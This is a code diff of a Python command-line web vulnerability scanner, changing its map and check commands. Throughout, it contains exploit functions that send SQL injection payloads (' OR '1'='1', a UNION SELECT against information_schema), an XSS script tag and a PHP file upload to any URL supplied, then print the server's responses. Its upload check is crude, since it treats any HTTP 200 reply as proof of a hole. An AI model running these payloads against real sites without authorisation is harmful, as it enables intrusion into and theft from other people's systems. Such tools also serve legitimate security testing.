@@ -9,7 +9,8 @@ import re
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin
 import logging
-from datetime import datetime
+from urllib.parse import urlparse
+import os
 
 click_completion.init()
 
@@ -90,10 +91,10 @@ def version():
 @click.argument("url", type=click.STRING)
 def map(url):
     # Step 1: Discover URLs on the website
+    parsed_url = urlparse(url)
+    domain = parsed_url.netloc
     discovered_urls = discover_urls(url)
-    current_datetime = datetime.now()
-    current_time_str = current_datetime.strftime("%Y%m%d")
-    logname = f"logs/map_{current_time_str}.log"
+    logname = f"logs/map_{domain}.log"
     logging.basicConfig(filename=logname,
                         filemode='a',
                         format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
@@ -104,58 +105,6 @@ def map(url):
         f"[bold cyan]Discovered {len(discovered_urls)} URLs on {url}:[/bold cyan]\n")
     for i, discovered_url in enumerate(discovered_urls, start=1):
         rprint(f"[bold green]{i}. {discovered_url}[/bold green]")
-
-    # Step 2: Scan discovered URLs for vulnerabilities
-    for page_url in discovered_urls:
-        vulnerabilities = scan_url(page_url)
-        if vulnerabilities:
-            rprint(
-                f"\n[bold white]Vulnerabilities found on {page_url}:[/bold white]")
-            for vulnerability, attack_method in vulnerabilities.items():
-                rprint(
-                    f"\n[bold red]Vulnerability: {vulnerability}[/bold red]")
-                rprint(f"[bold red]Attack Method: {attack_method}[/bold red]")
-                if vulnerability == "SQL injection vulnerability":
-                    rprint("[bold blue]\nSQL Injection Method:[/bold blue]")
-                    rprint(
-                        "[blue]1. Identify the input field vulnerable to SQL injection[/blue]")
-                    rprint(
-                        "[blue]2. Inject SQL code to manipulate the query, e.g., ' OR '1'='1'[/blue]")
-                    rprint(
-                        "[blue]3. Observe the response for any error messages or unusual behavior[/blue]")
-                    exploit_sql_injection(url)
-                elif vulnerability == "Cross-site scripting (XSS) vulnerability":
-                    rprint("[bold blue]\nXSS Attack Method:[/bold blue]")
-                    rprint(
-                        "[blue]1. Identify the input field vulnerable to XSS[/blue]")
-                    rprint(
-                        "[blue]2. Inject malicious scripts, e.g., <script>alert('XSS')</script>[/blue]")
-                    rprint(
-                        "[blue]3. Observe the behavior of the injected script[/blue]")
-                    exploit_xss_vulnerability(url)
-                elif vulnerability == "Directory Traversal vulnerability":
-                    rprint(
-                        "[bold blue]\nDirectory Traversal Attack Method:[/bold blue]")
-                    rprint(
-                        "[blue]1. Attempt to navigate to directories outside of the web root[/blue]")
-                    rprint(
-                        "[blue]2. Access sensitive files such as configuration files[/blue]")
-                    exploit_directory_traversal(url)
-                elif vulnerability == "Remote Code Execution vulnerability":
-                    rprint(
-                        "[bold blue]\nRemote Code Execution Attack Method:[/bold blue]")
-                    rprint(
-                        "[blue]1. Identify input fields or parameters that allow execution of code[/blue]")
-                    rprint(
-                        "[blue]2. Inject code to execute commands on the server[/blue]")
-                    exploit_remote_code_execution(url)
-                elif vulnerability == "File Upload vulnerability":
-                    rprint("[bold blue]\nFile Upload Attack Method:[/bold blue]")
-                    rprint(
-                        "[blue]1. Identify the file upload functionality[/blue]")
-                    rprint(
-                        "[blue]2. Upload a malicious file containing code or executable payload[/blue]")
-                    exploit_file_upload(url)
 
 
 def discover_urls(url):
@@ -177,26 +126,41 @@ def discover_urls(url):
     return discovered_urls
 
 
-def scan_url(url):
-    vulnerabilities = {}
+@click.command()
+@click.argument("url", type=click.STRING)
+@click.option("--sql", is_flag=True, default=False, help="Check for SQL injection vulnerability")
+@click.option("--xss", is_flag=True, default=False, help="Check for XSS vulnerability")
+@click.option("--conf", is_flag=True, default=False, help="Check for insecure configuration vulnerability")
+@click.option("--dirtv", is_flag=True, default=False, help="Check for directory traversal vulnerability")
+@click.option("--rcev", is_flag=True, default=False, help="Check for remote code execution vulnerability")
+@click.option("--fuv", is_flag=True, default=False, help="Check for file upload vulnerability")
+def check(url, sql, xss, conf, dirtv, rcev, fuv):
+    if url:
+        check_vulnerabilities(url, sql, xss, conf, dirtv, rcev, fuv)
+    else:
+        rprint("[white bold]No URL provided.[/white bold]")
 
-    # Step 1: Perform vulnerability scans using a vulnerability scanner or custom checks
 
-    # Example: Check for SQL injection vulnerability
-    if is_sql_injection_vulnerable(url):
-        vulnerabilities["SQL injection vulnerability"] = "Injecting SQL code into input fields"
-
-    # Example: Check for cross-site scripting (XSS) vulnerability
-    if is_xss_vulnerable(url):
-        vulnerabilities["Cross-site scripting (XSS) vulnerability"] = "Injecting malicious scripts into input fields"
-
-    # Step 2: Perform additional vulnerability checks or manual code review
-
-    # Example: Check for insecure server configuration
-    if has_insecure_configuration(url):
-        vulnerabilities["Insecure server configuration"] = "Exploiting insecure communication protocols"
-
-    return vulnerabilities
+def check_vulnerabilities(url, sql, xss, conf, dirtv, rcev, fuv):
+    if sql:
+        rprint(
+            f"[bold red]SQL injection: {is_sql_injection_vulnerable(url)}[/bold red]")
+    if xss:
+        rprint(f"[bold red]XSS: {is_xss_vulnerable(url)}[/bold red]")
+    if conf:
+        rprint(
+            f"[bold red]Insecure configuration: {has_insecure_configuration(url)}[/bold red]")
+    if dirtv:
+        rprint(
+            f"[bold red]Directory tranversal: {is_directory_traversal_vulnerable(url)}[/bold red]")
+    if rcev:
+        rprint(
+            f"[bold red]Remote code execution: {is_remote_code_execution_vulnerable(url)}[/bold red]")
+    if fuv:
+        rprint(
+            f"[bold red]File upload vulnerable: {is_file_upload_vulnerable(url)}[/bold red]")
+    if not (sql or xss or conf or dirtv or rcev or fuv):
+        rprint("[white bold]No vulnerabilities checked.[/white bold]")
 
 
 def is_sql_injection_vulnerable(url):
@@ -247,40 +211,48 @@ def is_remote_code_execution_vulnerable(url):
 
 
 def is_file_upload_vulnerable(url):
-    # Check if the website allows uploading of potentially executable files
-    # Example: Check if file upload accepts .php files
-    test_file = "test.php"
-    files = {'file': open(test_file, 'rb')}
-    response = requests.post(url + "/upload", files=files)
-    if test_file in response.text:
-        return True
-    return False
+    test_file_path = 'test.php'
+    if os.path.exists(test_file_path):
+        try:
+            files = {'file': open(test_file_path, 'rb')}
+            response = requests.post(url, files=files)
+            if response.status_code == 200:
+                return True
+            else:
+                return False
+        except Exception as e:
+            rprint(
+                f"[bold red]Error occurred while testing file upload vulnerability: {e} [/bold red]")
+            return False
+    else:
+        rprint(f"[bold red]Test file '{test_file_path}' not found.[/bold red]")
+        return False
 
-
-# def exploit_sql_injection(url):
-#     # Placeholder function for exploiting SQL injection vulnerability
-#     rprint(
-#         f"[bold red]Exploiting SQL injection vulnerability on {url}[/bold red]")
-#     # Example:
-#     # Inject SQL code to retrieve sensitive data or manipulate the database
-#     # e.g., SELECT * FROM users WHERE username='admin' AND password='12345'
-#     # Perform the SQL injection attack and observe the response
-#     response = requests.get(url + "?id=' OR '1'='1'")
-#     rprint(
-#         f"[bold red]Response after exploiting SQL injection: {response.text} [/bold red]")
 
 def exploit_sql_injection(url):
-    # Exploiting SQL injection vulnerability
-    print(f"Exploiting SQL injection vulnerability on {url}")
-
-    # Inject SQL code to retrieve data from a database
-    payload = "?id=1' UNION SELECT table_name FROM information_schema.tables--"
-
+    # Placeholder function for exploiting SQL injection vulnerability
+    rprint(
+        f"[bold red]Exploiting SQL injection vulnerability on {url}[/bold red]")
+    # Example:
+    # Inject SQL code to retrieve sensitive data or manipulate the database
+    # e.g., SELECT * FROM users WHERE username='admin' AND password='12345'
     # Perform the SQL injection attack and observe the response
-    response = requests.get(url + payload)
+    response = requests.get(url + "?id=' OR '1'='1'")
+    rprint(
+        f"[bold red]Response after exploiting SQL injection: {response.text} [/bold red]")
 
-    # Print the response after exploiting SQL injection
-    print(f"Response after exploiting SQL injection: {response.text}")
+# def exploit_sql_injection(url):
+#     # Exploiting SQL injection vulnerability
+#     print(f"Exploiting SQL injection vulnerability on {url}")
+
+#     # Inject SQL code to retrieve data from a database
+#     payload = "?id=1' UNION SELECT table_name FROM information_schema.tables--"
+
+#     # Perform the SQL injection attack and observe the response
+#     response = requests.get(url + payload)
+
+#     # Print the response after exploiting SQL injection
+#     print(f"Response after exploiting SQL injection: {response.text}")
 
 
 def exploit_xss_vulnerability(url):
